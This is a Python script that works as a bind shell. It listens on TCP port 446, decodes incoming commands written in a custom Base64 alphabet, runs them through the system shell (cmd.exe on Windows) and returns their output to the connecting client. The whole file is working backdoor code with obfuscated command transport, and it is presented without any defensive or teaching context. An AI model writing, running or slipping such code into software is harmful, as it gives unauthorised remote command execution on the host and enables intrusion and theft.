import os
import socket
import subprocess

# Custom Base64 alphabet
CUSTOM_ALPHABET = "~!@#$%^&*()_+=-0987654321`:;'{jKlMnOpQrStUvWxYzaBcDeFgHi,.<>?[]}"
CUSTOM_ALPHABET_MAP = {char: idx for idx, char in enumerate(CUSTOM_ALPHABET)}

def custom_base64_decode(encoded: str) -> str:
    """Custom Base64 decoding"""
    # First, remove any padding (#) and ensure no invalid characters exist
    encoded = encoded.rstrip('#')  # Remove padding
    # Build the binary string by mapping each character to its binary equivalent
    binary_string = ''.join(f'{CUSTOM_ALPHABET_MAP[char]:06b}' for char in encoded if char in CUSTOM_ALPHABET_MAP)
    
    # Split into 8-bit chunks and decode as a string
    chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    decoded = ''.join(chr(int(chunk, 2)) for chunk in chunks)
    
    # Ensure no null characters in the decoded string
    if '\x00' in decoded:
        print("[*] Warning: Null character detected in decoded command, skipping.")
        decoded = decoded.replace('\x00', '')  # Remove any null characters
    
    return decoded

# Server details
HOST = '0.0.0.0'  # The IP of the listener.
PORT = 446              # The same port as listener.

# Set up the server to listen for connections
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print("[*] Waiting for connection...")
client_socket, client_address = s.accept()
print(f"[*] Connection from {client_address}")

while True:
    try:
        # Receive the Base64 encoded command
        encoded_command = client_socket.recv(1024).decode("utf-8")
        print(f"[*] Received Encoded Command: {encoded_command}")  # Debug print

        if not encoded_command:  # If no data is received, exit
            print("[*] No data received, closing connection.")
            break

        # Decode the custom Base64 encoded command
        command = custom_base64_decode(encoded_command)
        print(f"[*] Decoded Command: {command}")  # Debug print

        # If the command is 'exit' or 'quit', break the loop and close the connection
        if command.lower() in ['exit', 'quit']:
            print("[*] Exiting server.")
            break

        # Windows-specific fix: ensure the command is executed properly
        print(f"[*] Executing Command: {command}")

        # Handle Windows-specific commands using cmd.exe
        if os.name == 'nt':  # Checking if it's running on Windows
            proc = subprocess.Popen(f'cmd.exe /c {command}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Get the command output (stdout and stderr)
        stdout_value, stderr_value = proc.communicate()

        # Ensure stdout and stderr are correctly decoded and handled as bytes
        stdout_str = stdout_value.decode('utf-8', errors='ignore')
        stderr_str = stderr_value.decode('utf-8', errors='ignore')

        # Print the outputs for debugging
        print(f"[*] stdout: {stdout_str}")
        print(f"[*] stderr: {stderr_str}")

        # Send the output back to the client
        if stdout_value or stderr_value:
            output = stdout_value + stderr_value
            print(f"[*] Command Output: {output.decode('utf-8', errors='ignore')}")  # Debug print
            client_socket.send(output)  # Send the bytes back to the client
        else:
            print("[*] No output from command.")
            client_socket.send(b"No output")  # Send a "No output" message if there's no output

    except Exception as e:
        print(f"Error while processing command: {e}")
        break

# Close the connection when done
client_socket.close()
s.close()
